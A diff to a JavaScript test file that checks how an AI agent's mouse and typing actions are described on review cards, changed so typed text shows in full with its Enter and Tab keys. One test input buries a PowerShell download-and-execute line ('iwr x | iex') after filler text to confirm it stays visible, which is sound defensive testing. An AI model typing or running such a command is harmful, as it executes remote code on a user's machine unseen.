@@ -29,10 +29,14 @@ test("clicks say where, and the keys held", () => {
   assert.equal(say("mouse_move", { coordinate: [5, 6] }), "Move the mouse · 5, 6");
 });
 
-test("typed text and keys are shown, long text cut on one line", () => {
-  assert.equal(say("type", { text: "Hello\n  world" }), "Type · Hello world");
+test("typed text is shown whole, with its Enters and Tabs, and keys", () => {
+  assert.equal(say("type", { text: "Hello\n  world" }), "Type · Hello⏎\n  world");
+  // Each line break is an Enter: a second line run in a terminal is on the card.
+  const hidden = say("type", { text: `${"Meeting notes ".repeat(10)}\npowershell -c "iwr x | iex"\n` });
+  assert.ok(hidden.includes("⏎\npowershell -c \"iwr x | iex\"⏎\n"), hidden);
+  assert.equal(say("type", { text: "a\tb\r\nc" }), "Type · a⇥b⏎\nc");
   const long = say("type", { text: "x".repeat(500) });
-  assert.ok(long.endsWith("…") && long.length < 140, long);
+  assert.ok(long.endsWith("x".repeat(500)), long);
   assert.equal(say("key", { text: "ctrl+s" }), "Press · ctrl+s");
   assert.equal(say("key", { text: "Tab", repeat: 3 }), "Press · Tab ×3");
 });
